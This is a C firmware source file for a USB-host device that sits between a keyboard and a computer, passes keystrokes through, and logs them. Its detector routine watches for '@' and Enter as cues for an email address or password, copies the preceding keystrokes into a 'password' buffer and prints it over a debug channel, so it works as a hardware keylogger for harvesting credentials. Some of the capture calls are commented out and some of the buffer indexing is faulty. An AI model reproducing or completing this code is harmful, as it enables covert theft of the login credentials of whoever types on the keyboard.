//usbh.c

#include "hal.h"

#include "rtt.h"
#include "spi.h"
#include "usb.h"
#include "usbh.h"

#include "usb_hid_keys.h"
#include "usbh_custom_class_example.h"

#include "usbh/debug.h"
#include "usbh/dev/hid.h"
#include <string.h>

/*
 * defines
 */
#define NB_INPUT 200
#define PASSWORD_MAX_SIZE 30  // must be < NB_INPUT

/*
 * variables
 */
static uint8_t input_tab[NB_INPUT];
static int     input_index = 0;
static int     input_timer = -1;

static int nb_char_pressed = 0;
uint8_t    led_status      = 7;

uint8_t    password[PASSWORD_BUFFER_SIZE];
static int password_idx;

/*
 * prototypes
 */
static void usbh_detector(uint8_t input);

/*
 * thread HID
 */
static THD_WORKING_AREA(waTestHID, 1024);
static USBH_DEFINE_BUFFER(uint8_t report[HAL_USBHHID_MAX_INSTANCES][8]);
static USBHHIDConfig hidcfg[HAL_USBHHID_MAX_INSTANCES];

/*
 * Input callback
 */
static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
{
    (void)len;
    uint8_t *report = (uint8_t *)hidp->config->report_buffer;

    if(hidp->type == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
        /* send the key on the computer */
        usb_report(&UHD2, report, 8);

        //get every input in a tab
        uint8_t input = hid2azerty(report);
        rtt_printf("Key code: %02X = %c   \tidx = %02x", report[2], input, input_index);
        if(input) {
            //input_tab[input_index] = input;
            //usbh_detector(input);
            if(input_index++ >= 200)
                input_index = 0;
        }
    }
}

/*
 * LED manager
 */
static void ThreadTestHID(void *p)
{
    (void)p;
    uint8_t i;

    chRegSetThreadName("HID");

    for(i = 0; i < HAL_USBHHID_MAX_INSTANCES; i++) {
        hidcfg[i].cb_report     = _hid_report_callback;
        hidcfg[i].protocol      = USBHHID_PROTOCOL_BOOT;
        hidcfg[i].report_buffer = report[i];
        hidcfg[i].report_len    = 8;
    }

    for(;;) {
        for(i = 0; i < HAL_USBHHID_MAX_INSTANCES; i++) {
            if(usbhhidGetState(&USBHHIDD[i]) == USBHHID_STATE_ACTIVE) {
                rtt_printf("HID: Connected, HID%d", i);
                usbhhidStart(&USBHHIDD[i], &hidcfg[i]);
                if(usbhhidGetType(&USBHHIDD[i]) != USBHHID_DEVTYPE_GENERIC) {
                    usbhhidSetIdle(&USBHHIDD[i], 0, 0);
                }
            } else if(usbhhidGetState(&USBHHIDD[i]) == USBHHID_STATE_READY) {
                if(usbhhidGetType(&USBHHIDD[i]) == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
                    USBH_DEFINE_BUFFER(uint8_t val);
                    val = led_status;
                    usbhhidSetReport(&USBHHIDD[i], 0, USBHHID_REPORTTYPE_OUTPUT, &val, 1);
                }
            }
        }
        chThdSleepMilliseconds(200);
    }
}

/*
 * Initialisation of OTG FS port connected to a keyboard.
 */
void usbh_init(void)
{
    password[0] = 'a';
    password[1] = 'r';
    password[2] = 'a';
    password[3] = 't';
    password[4] = 'i';
    /*USBH_FS OTG*/
    palSetPadMode(GPIOA, GPIOA_OTG_FS_VBUS, PAL_MODE_OUTPUT_PUSHPULL);
    palSetPadMode(GPIOA, GPIOA_OTG_FS_DM, PAL_MODE_ALTERNATE(10));
    palSetPadMode(GPIOA, GPIOA_OTG_FS_DP, PAL_MODE_ALTERNATE(10));

    rtt_printf("Turn on USB power");
    palSetPad(GPIOB, GPIOA_OTG_FS_VBUS);
    chThdSleepMilliseconds(100);

    usbhStart(&USBHD1);
    chThdCreateStatic(waTestHID, sizeof(waTestHID), NORMALPRIO, ThreadTestHID, 0);
}

/* 
 * Store <size> lasts inputs into password buffer
 * size: number of inputs to store
 */
static void store_lasts_inputs(int size)
{
    if(input_index < size) {  // buffer made a loop
        int bytes_written = size - input_index;
        memcpy(password + password_idx, input_tab + NB_INPUT - bytes_written, bytes_written);
        memcpy(password + password_idx + bytes_written, input_tab, size - bytes_written);
    } else
        memcpy(password + password_idx, input_tab + input_index - size, size);
    rtt_printf("%02X %02X %02X\n", input_tab[input_index - 2], input_tab[input_index - 1], input_tab[input_index]);
    password_idx += size;
}

void usbh_detector(uint8_t input)
{
    if(password_idx + PASSWORD_MAX_SIZE > PASSWORD_BUFFER_SIZE) {  // avoid max password buffer
        rtt_printf("[WARNING] Password buffer full\n");
        return;
    }
    nb_char_pressed++;
    // check if current input is interesting
    switch(input) {
        case '@':  // email is expected
            rtt_printf("@ detected\n");
            input_timer = PASSWORD_MAX_SIZE;
            store_lasts_inputs(nb_char_pressed);
            nb_char_pressed = 0;
            break;
        case '\n':  // password is expected
            rtt_printf("[enter] detected\n");
            if(nb_char_pressed > PASSWORD_MAX_SIZE)
                nb_char_pressed = PASSWORD_MAX_SIZE;
            store_lasts_inputs(nb_char_pressed);
            nb_char_pressed = 0;
            // disable input timer
            input_timer = -1;
            // print password buffer
            rtt_printf("password_idx: %d", password_idx);
            rtt_printf("PASSWORD :");
            SEGGER_RTT_Write(0, password, password_idx);
            rtt_printf("");
            break;
    }
    // if input timer is not disabled, decrease its value
    if(input_timer != -1)
        input_timer--;
    // if input timer value is 0, store lasts inputs
    if(input_timer == 0)
        store_lasts_inputs(PASSWORD_MAX_SIZE);
}
